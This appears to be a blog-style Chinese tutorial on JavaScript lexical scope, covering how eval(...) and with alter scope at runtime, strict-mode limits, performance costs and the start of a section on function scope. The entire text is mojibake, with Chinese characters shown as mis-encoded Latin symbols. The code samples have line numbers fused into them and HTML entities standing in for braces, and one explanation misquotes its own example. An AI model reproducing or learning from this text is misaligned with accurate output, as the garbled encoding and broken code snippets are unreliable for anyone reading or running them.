æ­¤å¯ä»¥ä¸ç›´æŽ¥é€šè¿‡å…¨å±€å¯¹è±¡çš„è¯æ³•åç§°ï¼Œè€Œæ˜¯é—´æŽ¥åœ°é€šè¿‡å¯¹å…¨å±€å¯¹è±¡å±žæ€§çš„åº”ç”¨æ¥å¯¹å…¶è¿›è¡Œè®¿é—®ã€‚ä¾‹å¦‚ï¼šwindow.a é€šè¿‡è¿™ç§æŠ€æœ¯å¯ä»¥è®¿é—®é‚£äº›è¢«åŒåå˜é‡æ‰€é®è”½çš„å…¨å±€å˜é‡ï¼Œä½†éžå…¨å±€çš„å˜é‡è¢«é®è”½äº†ï¼Œæ— è®ºå¦‚ä½•éƒ½æ— æ³•è¢«è®¿é—®åˆ°ã€‚ æ— è®ºå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨ï¼Œä¹Ÿæ— è®ºå®ƒå¦‚ä½•è¢«è°ƒç”¨ï¼Œå®ƒçš„è¯æ³•ä½œç”¨åŸŸéƒ½åªç”±å‡½æ•°è¢«å£°æ˜Žæ—¶æ‰€å¤„çš„ä½ç½®å†³å®šã€‚è¯æ³•ä½œç”¨åŸŸæŸ¥æ‰¾åªä¼šæŸ¥æ‰¾ä¸€çº§æ ‡è¯†ç¬¦ï¼Œæ¯”å¦‚aã€bå’Œcã€‚å¦‚æžœä»£ç ä¸­å¼•ç”¨äº†foo.bar.baz,è¯æ³•ä½œç”¨åŸŸæŸ¥æ‰¾åªä¼šè¯•å›¾æŸ¥æ‰¾ foo æ ‡è¯†ç¬¦ï¼Œæ‰¾åˆ°è¿™ä¸ªå˜é‡åŽï¼Œå¯¹è±¡å±žæ€§è®¿é—®è§„åˆ™ä¼šåˆ†åˆ«ç»“å…³å¯¹ bar å’Œ baz å±žæ€§çš„è®¿é—®ã€‚ æ¬ºéª—è¯æ³•å¦‚æžœè¯æ³•ä½œç”¨åŸŸå®Œå…¨ç”±å†™ä»£ç æœŸé—´å‡½æ•°æ‰€å£°æ˜Žçš„ä½ç½®æ¥å®šä¹‰ï¼Œæ€Žæ ·æ‰èƒ½åœ¨è¿è¡Œæ—¶æ¥â€œä¿®æ”¹â€ï¼ˆæ¬ºéª—ï¼‰è¯æ³•ä½œç”¨åŸŸå‘¢ï¼Ÿ JavaScript ä¸­æœ‰ä¸¤ç§æœºåˆ¶æ¥å®žçŽ°è¿™ä¸ªç›®çš„ï¼Œä¸è¿‡è¿™ä¸¤ç§æœºåˆ¶æ™®éè®¤ä¸ºä¸æ˜¯ä»€ä¹ˆå¥½ä¸»æ„ï¼Œæ¬ºéª—è¯æ³•ä½œç”¨åŸŸä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ï¼Œè§£é‡Šæ€§èƒ½ä¹‹å‰ï¼Œå…ˆè¯´ä¸€ä¸‹ä¸¤ç§æœºåˆ¶çš„åŽŸç†ã€‚ evalJavaScript ä¸­çš„ eval(â€¦)å‡½æ•°å¯ä»¥æŽ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°ï¼Œå¹¶å°†å…¶ä¸­çš„å†…å®¹è§†ä¸ºå¥½åƒåœ¨ä¹¦å†™æ—¶å°±å­˜åœ¨äºŽç¨‹åºä¸­é‚£ä¸ªä½ç½®çš„ä»£ç ã€‚æ¢å¥è¯è¯´ï¼Œå¯ä»¥åœ¨ä½ å†™çš„ä»£ç ä¸­ç”¨ç¨‹åºç”Ÿæˆä»£ç å¹¶ä¸”è¿è¡Œï¼Œå°±åƒä»£ç æ˜¯å†™åœ¨é‚£ä¸ªä½ç½®çš„ä¸€æ ·ã€‚ æ ¹æ®è¿™ä¸ªåŽŸç†æ¥ç†è§£ eval(â€¦)ï¼Œå®ƒæ˜¯å¦‚ä½•é€šè¿‡ä»£ç æ¬ºéª—å’Œå‡è£…ä¹¦å†™æ—¶ï¼ˆä¹Ÿå°±æ˜¯è¯æ³•æœŸï¼‰ä»£ç å°±åœ¨é‚£ï¼Œæ¥å®žçŽ°ä¿®æ”¹ä¿®æ”¹è¯æ³•ä½œç”¨åŸŸçŽ¯å¢ƒçš„ï¼Œè¿™ä¸ªåŽŸç†å°±å˜å¾—æ¸…æ™°æ˜“æ‡‚äº†ã€‚ åœ¨æ‰§è¡Œ eval(â€¦) ä¹‹åŽçš„ä»£ç ï¼Œå¼•æ“Žå¹¶ä¸çŸ¥é“æˆ–è€…æ˜¯åœ¨æ„å‰é¢çš„ä»£ç æ˜¯ä»¥åŠ¨æ€å½¢å¼æ’å…¥è¿›æ¥ï¼Œå¹¶å¯¹è¯æ³•ä½œç”¨åŸŸçš„çŽ¯å¢ƒè¿›è¡Œä¿®æ”¹çš„ï¼Œå¼•æ“Žåªä¼šå¦‚å¾€å¸¸è¿›è¡Œè¯æ³•ä½œç”¨åŸŸæŸ¥æ‰¾ æŸ¥çœ‹ä¸€ä¸‹çš„ä»£ç ï¼š 123456function foo(str,a)&#123; eval(str); console.log(a,b);&#125;var b = 2;foo("var b = 3;",1); // 1, 3 eval(â€¦)è°ƒç”¨ä¸­çš„ â€œvar b = 2â€è¿™æ®µä»£ç ä¼šè¢«å½“åšåŽŸæ¥å°±å­˜åœ¨é‚£é‡Œä¸€æ ·æ¥å¤„ç†ã€‚ç”±äºŽè¿™æ®µä»£ç å£°æ˜Žäº†ä¸€ä¸ªæ–°çš„å˜é‡b,å› æ­¤å®ƒå¯¹å·²ç»å­˜åœ¨çš„ foo(â€¦)çš„è¯æ³•ä½œç”¨åŸŸè¿›è¡Œäº†ä¿®æ”¹ï¼Œäº‹å®žä¸Šï¼Œå’Œå‰é¢æåˆ°çš„åŽŸç†ä¸€æ ·ï¼Œè¿™æ®µä»£ç å®žé™…ä¸Šåœ¨ foo(â€¦)å†…éƒ¨åˆ›å»ºäº†ä¸€ä¸ª å˜é‡ bï¼Œå¹¶é®è”½äº†å¤–éƒ¨ï¼ˆå…¨å±€çš„ï¼‰ä½œç”¨åŸŸä¸­çš„å˜é‡ã€‚ å½“ console.log(â€¦)è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šåœ¨ foo(â€¦)å†…éƒ¨åŒæ—¶æ‰¾åˆ°a å’Œ bã€‚ä½†æ˜¯æ°¸è¿œä¹Ÿæ‰¾ä¸åˆ°å¤–éƒ¨çš„ b,å› ä¸ºä¼šè¾“å‡ºâ€œ1, 3â€è€Œä¸æ˜¯ â€œ1, 2â€ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œä¸ºäº†å±•ç¤ºçš„æ–¹ä¾¿å’Œç®€æ´ï¼Œæˆ‘ä»¬ä¼ é€’è¿›åŽ»çš„ä»£ç å­—ç¬¦ä¸²æ˜¯å›ºå®šä¸å˜çš„ï¼Œè€Œåœ¨å®žé™…æƒ…å†µä¸­ï¼Œå¯ä»¥éžå¸¸å®¹æ˜“åœ°æ ¹æ®ç¨‹åºé€»è¾‘åŠ¨æ€åœ°å°†å­—ç¬¦æ‹¼æŽ¥åœ¨ä¸€èµ·ä¹‹åŽå†ä¼ é€’è¿›åŽ»ã€‚eval(â€¦)é€šå¸¸è¢«ç”¨æ¥æ‰§è¡ŒåŠ¨æ€åˆ›å»ºçš„ä»£ç ï¼Œå› ä¸ºåƒä¾‹å­ä¸­é‚£æ ·åŠ¨æ€åœ°æ‰§è¡Œä¸€æ®µå›ºå®šå­—ç¬¦æ‰€ç»„æˆçš„ä»£ç ï¼Œå¹¶æ²¡æœ‰æ¯”ç›´æŽ¥å°†ä»£ç å†™åœ¨é‚£é‡Œæœ‰å¥½å¤„ é»˜è®¤æƒ…å†µä¸‹ï¼Œeval(â€¦)ä¸­æ‰€æ‰§è¡Œçš„ä»£ç åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªå£°æ˜Žï¼ˆæ— è®ºæ˜¯å˜é‡è¿˜æ˜¯å‡½æ•°ï¼‰ï¼Œå°±ä¼šå¯¹ eval(â€¦)æ‰€å¤„çš„è¯æ³•ä½œç”¨åŸŸè¿›è¡Œä¿®æ”¹ï¼ŒæŠ€æœ¯ä¸Šï¼Œé€šè¿‡ä¸€äº›æŠ€å·§å¯ä»¥é—´æŽ¥åœ°è°ƒç”¨ eval(â€¦)æ¥ä½¿å…¶è¿è¡Œåœ¨å…¨å±€ä½œç”¨åŸŸä¸­ï¼Œå¹¶å¯¹å…¨å±€ä½œç”¨åŸŸè¿›è¡Œä¿®æ”¹ã€‚ä½†æ— è®ºä½•ç§æƒ…å†µï¼Œeval(â€¦)éƒ½å¯ä»¥åœ¨è¿è¡ŒæœŸé—´ä¿®æ”¹ä¹¦å†™æœŸçš„è¯æ³•ä½œç”¨åŸŸã€‚ åœ¨ä¸¥æ ¼æ¨¡å¼çš„ç¨‹åºä¸­ï¼Œeval(â€¦)åœ¨è¿è¡Œæ—¶å°¤å…¶è‡ªå·±çš„è¯æ³•ä½œç”¨åŸŸï¼Œæ„å‘³ç€å…¶ä¸­çš„å£°æ˜Žæ— æ³•ä¿®æ”¹æ‰€åœ¨çš„ä½œç”¨åŸŸ 123456function foo(str)&#123; "use strict" eval(str); console.log(a); // ReferenceError: a is not defined&#125;foo("var a = 2"); JavaScript ä¸­è¿˜æœ‰å…¶ä»–ä¸€äº›åŠŸèƒ½æ•ˆæžœå’Œ eval(â€¦)å¾ˆç›¸ä¼¼ã€‚setTimeout å’Œ setInterval çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¸ºå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„å†…å®¹å¯ä»¥è§£é‡Šä¸ºä¸€æ®µåŠ¨æ€ç”Ÿæˆçš„å‡½æ•°ä»£ç ï¼Œè¿™äº›åŠŸèƒ½å·²ç»è¿‡æ—¶äº†å¹¶ä¸è¢«æå€¡äº†ï¼Œä¸è¦ä½¿ç”¨ã€‚ new Function(â€¦)å‡½æ•°çš„è¡Œä¸ºä¹Ÿå¾ˆç±»ä¼¼ï¼Œæœ€åŽä¸€ä¸ªå‚æ•°å¯ä»¥æŽ¥å—ä»£ç å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è½¬åŒ–æˆåŠ¨æ€ç”Ÿæˆçš„å‡½æ•°ã€‚è¿™ç§æž„å»ºå‡½æ•°çš„è¯­æ³•æ¯”è¾ƒ eval ç•¥å¾®å®‰å…¨ä¸€ç‚¹ã€‚ä½†ä¹Ÿè¦å°½é‡é¿å…ä½¿ç”¨ã€‚åœ¨ç¨‹åºæ±‡ä¸­åŠ¨æ€ç”Ÿæˆä»£ç çš„ä½¿ç”¨åœºæ™¯å¾ˆç½•è§ï¼Œå› ä¸ºå®ƒæ‰€å¸¦æ¥çš„å¥½å¤„æ— æ³•æŠµæ¶ˆæ€§èƒ½ä¸Šçš„æŸè€—ã€‚ withJavaScript å¦å¤–ä¸€ä¸ªéš¾ä»¥æŽŒæ¡çš„çŽ°åœ¨ä¹Ÿä¸æŽ¨èä½¿ç”¨çš„ç”¨æ¥æ¬ºéª—è¯æ³•ä½œç”¨åŸŸçš„åŠŸèƒ½æ˜¯with å…³é”®å­—ã€‚å¯ä»¥æœ‰å¾ˆå¤šæ–¹æ³•æ¥è§£é‡Š withã€‚è¿™é‡Œç”¨è¿™ä¸ªè§’åº¦æ¥è§£é‡Šï¼šå®ƒå¦‚ä½•åŒè¢«å®ƒæ‰€å½±å“çš„è¯æ³•ä½œç”¨åŸŸè¿›è¡Œäº¤äº’ with é€šå¸¸è¢«å½“åšé‡å¤å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ä¸­çš„å¤šä¸ªå±žæ€§çš„å¿«æ·æ–¹å¼ï¼Œå¯ä»¥ä¸éœ€è¦é‡å¤å¼•ç”¨å¯¹è±¡æœ¬èº«ã€‚ æ¯”å¦‚ï¼š 12345678910111213141516171819202122232425262728293031323334353637var obj = &#123; a:1, b:2, c:3&#125;// å•è°ƒä¹å‘³çš„é‡å¤ â€œobjâ€obj.a = 2;obj.b = 3;obj.c = 4;// ç®€å•çš„å¿«æ·æ–¹å¼with(obj)&#123; a = 3; b = 4; c = 5;&#125;// ä½†å®žé™…ä¸Šè¿™ä¸ä»…ä»…æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°è®¿é—®å¯¹è±¡å±žæ€§ã€‚æ€è€ƒä¸€ä¸‹ä»£ç ï¼šfunction foo(obj)&#123; with(obj)&#123; a = 2; &#125;&#125;var o1 = &#123; a:3&#125;var o2 =&#123; b:3&#125;foo(o1);o1.a; // 2foo(o2)o2.a; // undefineda // 2â€”â€”ä¸å¥½ï¼Œa è¢«æ³„éœ²åˆ°å…¨å±€ä½œç”¨åŸŸä¸Šäº†// ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­åˆ›å»º o1 å’Œ o2 ä¸¤ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰ a çš„å±žæ€§ï¼Œå¦å¤–ä¸€ä¸ªæ²¡æœ‰ã€‚foo(...)å‡½æ•°æŽ¥å—äº†ä¸€ä¸ª obj å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶å¯¹è¿™ä¸ªå¯¹è±¡å¼•ç”¨æ‰§è¡Œäº† with(obj)&#123;..&#125;ã€‚è¿™ with å—å†…éƒ¨ï¼Œä»£ç çœ‹èµ·æ¥åªæ˜¯å¯¹å˜é‡ aè¿›è¡Œç®€å•çš„è¯æ³•å¼•ç”¨ï¼Œå®žé™…ä¸Šæ˜¯ä¸€ä¸ª LHS æŸ¥æ‰¾ï¼Œå¹¶å°† 2 èµ‹å€¼ç»™å®ƒã€‚// å½“æˆ‘ä»¬å°† o1ä¼ é€’è¿›åŽ»ï¼Œa = 2 èµ‹å€¼æ“ä½œæ‰¾åˆ°äº† o1.aå¹¶å°†2èµ‹å€¼ç»™å®ƒã€‚è€Œ o2ä¸­æ²¡æœ‰aå±žæ€§ï¼Œå› ä¸ºä¸ä¼šåˆ›å»ºè¿™ä¸ªå±žæ€§ï¼Œä¿æŒ undefinedã€‚è‡³äºŽå®žé™…ä¸Š a = 2èµ‹å€¼æ“ä½œåˆ›å»ºäº†ä¸€ä¸ªå…¨å±€çš„å˜é‡ a æ˜¯å› ä¸º with å¯ä»¥å°†ä¸€ä¸ªæ²¡æœ‰æˆ–æœ‰å¤šä¸ªå±žæ€§çš„å¯¹è±¡å¤„ç†æˆä¸€ä¸ªå®Œå…¨éš”ç¦»çš„è¯æ³•ä½œç”¨åŸŸï¼Œå› ä¸ºè¿™ä¸ªå¯¹è±¡çš„å±žæ€§ä¹Ÿä¼šè¢«å¤„ç†æˆå®šä¹‰åœ¨è¿™ä¸ªä½œç”¨åŸŸä¸­çš„è¯æ³•æ ‡è¯†ç¬¦ã€‚ å°½ç®¡ with å—å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡å¤„ç†ä¸ºè¯æ³•ä½œç”¨åŸŸï¼Œä½†æ˜¯è¿™ä¸ªå—å†…éƒ¨æ­£å¸¸çš„ var å£°æ˜Žå¹¶ä¸è¢«é™åˆ¶åœ¨è¿™ä¸ªå—çš„ä½œç”¨åŸŸä¸­ï¼Œè€Œæ˜¯è¢«æ·»åŠ åˆ° with æ‰€å¤„çš„å‡½æ•°ä½œç”¨åŸŸä¸­ã€‚ eval(..)å‡½æ•°å¦‚æžœæŽ¥å—äº†å«æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªå£°æ˜Žçš„ä»£ç ï¼Œå°±ä¼šä¿®æ”¹æ‰€å¤„çš„è¯æ³•ä½œç”¨åŸŸï¼Œè€Œ with å£°æ˜Žå®žé™…ä¸Šæ˜¯æ ¹æ®ä½ ä¼ é€’ç»™å®ƒçš„å¯¹è±¡å‡­ç©ºåˆ›å»ºäº†ä¸€ä¸ªå…¨æ–°çš„è¯æ³•ä½œç”¨åŸŸã€‚ å¯ä»¥è¿™ä¹ˆç†è§£ï¼Œå½“æˆ‘ä»¬ä¼ é€’ o1 ç»™ with æ—¶ï¼Œwith æ‰€å£°æ˜Žçš„ä½œç”¨åŸŸæ˜¯ o1ï¼Œè€Œè¿™ä¸ªä½œç”¨åŸŸä¸­å«æœ‰ä¸€ä¸ªåŒ o1.a å±žæ€§ç›¸ç¬¦çš„æ ‡è¯†ç¬¦ã€‚å½“æˆ‘ä»¬å°† o2 ä½œä¸ºä½œç”¨åŸŸæ—¶ï¼Œå…¶ä¸­å¹¶æ²¡æœ‰ a æ ‡è¯†ç¬¦ï¼Œå› æ­¤è¿›è¡Œäº†æ­£å¸¸çš„ LHS æ ‡è¯†ç¬¦æŸ¥æ‰¾ã€‚ o2 çš„ä½œç”¨åŸŸã€foo(â€¦)çš„ä½œç”¨åŸŸå’Œå…¨å±€ä½œç”¨åŸŸéƒ½æ²¡æœ‰æ‰¾åˆ°æ ‡è¯†ç¬¦ a,å› æ­¤å½“æ‰§è¡Œ a = 2çš„æ—¶å€™ï¼Œè‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å˜é‡ï¼ˆå› ä¸ºæ˜¯éžä¸¥æ ¼æ¨¡å¼ï¼‰ with è¿™ç§å°†å¯¹è±¡åŠå…¶å±žæ€§æ”¾è¿›ä¸€ä¸ªä½œç”¨åŸŸå¹¶åŒæ—¶åˆ†é…æ ‡è¯†ç¬¦çš„è¡Œä¸ºå¾ˆè®©äººè´¹è§£ã€‚ å¦å¤–ä¸€ä¸ªä¸æŽ¨èä½¿ç”¨ eval(â€¦)ä»¥åŠ withçš„åŽŸå› æ˜¯ä¼šè¢«ä¸¥æ ¼æ¨¡å¼æ‰€å½±å“ï¼ˆé™åˆ¶ï¼‰ã€‚withå®Œå…¨è¢«ç¦æ­¢äº†ï¼Œå„¿å­å•Šä¿ç•™æ ¸å¿ƒåŠŸèƒ½çš„å‰æä¸‹ï¼Œç®€æ´æˆ–éžå®‰å…¨åœ°ä½¿ç”¨ eval(â€¦)ä¹Ÿè¢«ç¦æ­¢äº† æ€§èƒ½eval(..)å’Œ with ä¼šåœ¨è¿è¡Œæ—¶å€™ä¿®æ”¹æˆ–è€…æ˜¯åˆ›å»ºæ–°çš„ä½œç”¨åŸŸï¼Œä»¥æ­¤æ¥æ¬ºéª—å…¶ä»–åœ¨ä¹¦å†™æ—¶å®šä¹‰çš„è¯æ³•ä½œç”¨åŸŸã€‚ JavaScript å¼•æ“Žä¼šåœ¨ç¼–è¯‘é˜¶æ®µè¿›è¡Œæ•°é¡¹çš„æ€§èƒ½ä¼˜åŒ–ï¼Œå…¶ä¸­æœ‰äº›ä¼˜åŒ–ä¾èµ–èƒ½å¤Ÿæ ¹æ®ä»£ç çš„è¯æ³•è¿›è¡Œé™æ€åˆ†æžï¼Œå¹¶é¢„å…ˆç¡®å®šæ‰€æœ‰å˜é‡å’Œå‡½æ•°çš„å®šä¹‰ä½ç½®ï¼Œæ‰èƒ½åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¿«é€Ÿæ‰¾åˆ°æ ‡è¯†ç¬¦ã€‚ ä½†å¦‚æžœå¼•æ“Žåœ¨ä»£ç ä¸­å‘çŽ°äº†ä¸Šè¿°ä¸¤ä¸ªæ–¹æ³•ï¼Œä¼šç®€å•çš„å‡è®¾å…³äºŽæ ‡è¯†ç¬¦ä½ç½®çš„åˆ¤æ–­éƒ½æ˜¯æ— æ•ˆçš„ã€‚å› ä¸ºæ— æ³•å†è¯æ³•åˆ†æžé˜¶æ®µæ˜Žç¡®çŸ¥é“ eval(â€¦)ä¼šæŽ¥å—åˆ°ä»€ä¹ˆæ ·çš„ä»£ç ï¼Œè¿™äº›ä»£ç ä¼šå¦‚ä½•å¯¹ä½œç”¨åŸŸè¿›è¡Œä¿®æ”¹ï¼Œä¹Ÿæ— æ³•çŸ¥é“ ä¼ é€’ç»™ with ç”¨æ¥åˆ›å»ºä½œç”¨åŸŸçš„å¯¹è±¡çš„å†…å®¹åˆ°åº•æ˜¯ä»€ä¹ˆã€‚ æœ€æ‚²è§‚çš„æƒ…å†µæ˜¯å¦‚æžœå‡ºçŽ°äº† eval(â€¦)æˆ–è€…withï¼Œæ‰€ä»¥çš„ä¼˜åŒ–éƒ½æœ‰å¯èƒ½æ˜¯æ— æ„ä¹‰çš„ï¼Œå› æ­¤æœ€ç®€å•åšæ³•å°±æ˜¯å®Œå…¨ä¸éœ€è¦åšä»»ä½•ä¼˜åŒ–ã€‚ å¦‚æžœä»£ç ä¸­å¤§é‡ä½¿ç”¨ eval æˆ–è€…æ˜¯ with.é‚£ä¹ˆè¿è¡Œèµ·æ¥ä¹Ÿä¼šéžå¸¸æ…¢ã€‚æ— è®ºå¼•æ“Žå¤šä¹ˆèªæ˜Žï¼Œè¯•å›¾å°†è¿™äº›æ‚²è§‚æƒ…å†µçš„å‰¯ä½œç”¨é™åˆ¶åœ¨æœ€å°èŒƒå›´å†…ï¼Œä¹Ÿæ— æ³•é¿å…å¦‚æžœæ²¡æœ‰è¿™äº›ä¼˜åŒ–ï¼Œä»£ç ä¼šè¿è¡Œçš„æ›´æ…¢çš„äº‹å®žã€‚ å°ç»“è¯æ³•ä½œç”¨åŸŸæ„å‘³ç€ä½œç”¨åŸŸæ˜¯ç”±ä¹¦å†™ä»£ç æ—¶å‡½æ•°å£°æ˜Žçš„ä½ç½®æ¥å†³å®šçš„ã€‚ç¼–è¯‘çš„è¯æ³•åˆ†æžé˜¶æ®µåŸºæœ¬èƒ½å¤ŸçŸ¥é“å…¨éƒ¨æ ‡è¯†ç¬¦åœ¨å“ªé‡Œå·²ç»å¦‚ä½•å£°æ˜Žçš„ï¼Œä»Žè€Œèƒ½å¤Ÿé¢„æµ‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚ä½•å¯¹å®ƒä»¬è¿›è¡ŒæŸ¥æ‰¾ã€‚ JavaScript ä¸­æœ‰ä¸¤ä¸ªæœºåˆ¶å¯ä»¥â€œæ¬ºéª—â€è¯æ³•ä½œç”¨åŸŸï¼ševal(..)å’Œwithã€‚å‰è€…å¯ä»¥å¯¹ä¸€æ®µåŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªå£°æ˜Žçš„â€œä»£ç â€å­—ç¬¦ä¸²è¿›è¡Œæ¼”ç®—ï¼Œå¹¶å€Ÿæ­¤æ¥ä¿®æ”¹å·²ç»å­˜åœ¨çš„è¯æ³•ä½œç”¨åŸŸï¼ˆåœ¨è¿è¡Œæ—¶ï¼‰ã€‚åŽè€…æœ¬è´¨ä¸Šæ˜¯é€šè¿‡è®²ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨å½“åšä½œç”¨åŸŸæ¥å¤„ç†ï¼Œå°†å¯¹è±¡çš„å±žæ€§å½“åšä½œç”¨åŸŸä¸­çš„æ ‡è¯†ç¬¦æ¥å¤„ç†ï¼Œä»Žè€Œåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„è¯æ³•ä½œç”¨åŸŸï¼ˆä¹Ÿæ˜¯åœ¨è¿è¡Œä¸­ï¼‰ã€‚ è¿™ä¸¤ä¸ªæœºåˆ¶çš„å‰¯ä½œç”¨å°±æ˜¯å¼•æ“Žæ— æ³•åœ¨ç¼–è¯‘æ—¶å¯¹ä½œç”¨åŸŸæŸ¥æ‰¾è¿›è¡Œä¼˜åŒ–ï¼Œå› ä¸ºå¼•æ“Žåªèƒ½è°¨æ…Žåœ°è®¤ä¸ºè¿™æ ·çš„ä¼˜åŒ–æ˜¯æ— æ•ˆçš„ã€‚ä½¿ç”¨è¿™å…¶ä¸­ä¸€ä¸ªæœºåˆ¶éƒ½å°†å¯¼è‡´ä»£ç è¿è¡Œå˜æ…¢ï¼Œæ‰€ä»¥ä¸è¦ä½¿ç”¨å®ƒä»¬ã€‚ å‡½æ•°ä½œç”¨åŸŸå’Œå—ä½œç”¨åŸŸæ­£å¦‚ä¸Šä¸€ç« ä»‹ç»ä¸€æ ·ï¼Œä½œç”¨åŸŸåŒ…å«äº†ä¸€ç³»åˆ—çš„ä½œç”¨åŸŸï¼Œæ¯ä¸€ä¸ªéƒ½å¯ä»¥ä½œä¸ºå®¹å™¨ï¼Œå…¶ä¸­åŒ…å«äº†æ ‡è¯†ç¬¦ï¼ˆå˜é‡ã€å‡½æ•°ï¼‰çš„å®šä¹‰ã€‚è¿™äº›ä½œç”¨åŸŸäº’ç›¸åµŒå¥—è€Œä¸”æ•´é½æŽ’åˆ—æˆèœ‚çªåž‹ï¼ŒæŽ’åˆ—çš„ç»“æž„æ˜¯åœ¨å†™ä»£ç çš„æ—¶å€™å®šä¹‰çš„ã€‚ å‡½æ•°ä¸­çš„ä½œç”¨åŸŸJavaScript å…·æœ‰å‡½æ•°çš„ä½œç”¨åŸŸï¼Œæ„å‘³ç€æ¯å£°æ˜Žä¸€ä¸ªå‡½æ•°éƒ½ä¸ºå…¶è‡ªèº«åˆ›å»ºä¸€ä¸ªå­ä½œç”¨åŸŸï¼Œè€Œå…¶ä»–ç»“æž„éƒ½ä¸ä¼šåˆ›å»ºä½œç”¨åŸŸã€‚äº‹å®žä¸Šè¿™å¹¶ä¸æ˜¯æ­£ç¡®çš„ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678function foo(a)&#123; var b = 2; // å…¶ä»–ä»£ç  function bar()&#123; // ... &#125; var c = 3;&#125; ä¸Šé¢çš„ä»£ç ä¸­ï¼Œfoo(â€¦)çš„ä½œç”¨åŸŸåŒ…å«äº†æ ‡è¯†ç¬¦ aã€bã€c å’Œ barï¼Œæ— è®ºæ ‡è¯†ç¬¦å£°æ˜Žå‡ºçŽ°åœ¨ä½œç”¨åŸŸçš„ä»€ä¹ˆåœ°æ–¹ï¼Œè¿™ä¸ªæ ‡è¯†ç¬¦æ‰€ä»£è¡¨çš„å˜é‡æˆ–å‡½æ•°éƒ½é™„å±žäºŽæ‰€å¤„ä½œç”¨åŸŸã€‚ bar(..)æœ‰ç”¨è‡ªå·±çš„ä½œç”¨åŸŸï¼Œå…¨å±€ä½œç”¨åŸŸä¹Ÿæœ‰è‡ªå·±çš„ï¼Œå®ƒåªåŒ…å«äº†ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼šfoo ç”±äºŽæ ‡è¯†ç¬¦aã€bã€c å’Œ bar éƒ½é™„å±ž foo(â€¦)çš„ä½œç”¨åŸŸï¼Œå› ä¸ºæ— æ³•ä»Ž foo(â€¦)çš„å¤–éƒ¨å¯¹å®ƒä»¬è¿›è¡Œè®¿é—®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™äº›æ ‡è¯†ç¬¦å…¨éƒ¨éƒ½æ— æ³•ä»Žå…¨å±€ä½œç”¨åŸŸä¸­è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºä¸‹é¢çš„ä»£ç ä¼šå¯¼è‡´ ReferenceErroré”™è¯¯ï¼š 12bar(); // å¤±è´¥console.log(a,b,c); // ä¸‰ä¸ªå…¨éƒ½å¤±è´¥ ä½†æ˜¯ï¼Œè¿™äº›æ ‡è¯†ç¬¦ï¼ˆaã€bã€cã€fooå’Œ barï¼‰åœ¨ foo(â€¦)çš„å†…éƒ¨éƒ½æ˜¯å¯ä»¥è¢«è®¿é—®çš„ï¼ŒåŒæ ·åœ¨ bar(â€¦)å†…éƒ¨ä¹Ÿå¯ä»¥è¢«è®¿é—®ï¼ˆå‡è®¾bar(â€¦)å†…éƒ¨æ²¡æœ‰åŒåçš„æ ‡è¯†ç¬¦ï¼‰ å‡½æ•°ä½œç”¨åŸŸçš„å«ä¹‰æ˜¯æŒ‡ï¼Œå±žäºŽè¿™ä¸ªå‡½æ•°çš„å…¨éƒ¨å˜é‡éƒ½å¯ä»¥åœ¨æ•´ä¸ªå‡½æ•°çš„èŒƒå›´å†…ä½¿ç”¨åŠé‡ç”¨ï¼ˆäº‹å®žä¸Šåœ¨åµŒå¥—çš„ä½œç”¨åŸŸä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼‰ã€‚è¿™ç§è®¾è®¡æ–¹æ¡ˆæ˜¯éžå¸¸æœ‰ç”¨çš„ï¼Œèƒ½å……åˆ†åˆ©ç”¨ JavaScript å˜é‡å¯ä»¥æ ¹æ®éœ€è¦æ”¹å˜å€¼ç±»åž‹çš„â€œåŠ¨æ€â€ç‰¹æ€§ã€‚ä½†æ˜¯å¦‚æžœä¸ç»†å¿ƒå¤„ç†é‚£äº›å¯ä»¥åœ¨æ•´ä¸ªä½œç”¨åŸŸèŒƒå›´å†…è¢«è®¿é—®çš„å˜é‡ï¼Œå¯èƒ½ä¼šå¸¦æ¥æ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚ éšè—å†…éƒ¨å®žçŽ°å¯¹å‡½æ•°ä¼ ç»Ÿçš„è®¤è¯†å°±æ˜¯å…ˆå£°æ˜Žä¸€ä¸ªå¯¹è±¡ã€‚ç„¶åŽå‘é‡Œé¢æ·»åŠ ä»£ç ï¼Œä½†æ˜¯åè¿‡æ¥æƒ³çš„è¯ï¼Œä¹Ÿå¯ä»¥æœ‰ä¸€äº›å¯ç¤ºï¼šä»Žæ‰€å†™çš„ä»£ç ä¸­æŒ‘å‡ºä¸€ä¸ªä»»æ„çš„ç‰‡æ®µï¼Œç„¶åŽç”¨å‡½æ•°å£°æ˜Žå¯¹å®ƒè¿›è¡ŒåŒ…è£…ï¼Œå®žé™…ä¸Šå°±æ˜¯æŠŠè¿™äº›ä»£ç ç»™â€œéšè—â€èµ·æ¥ã€‚ å®žé™…çš„ç»“æžœç»“æžœå°±æ˜¯åœ¨è¿™ä¸ªä»£ç 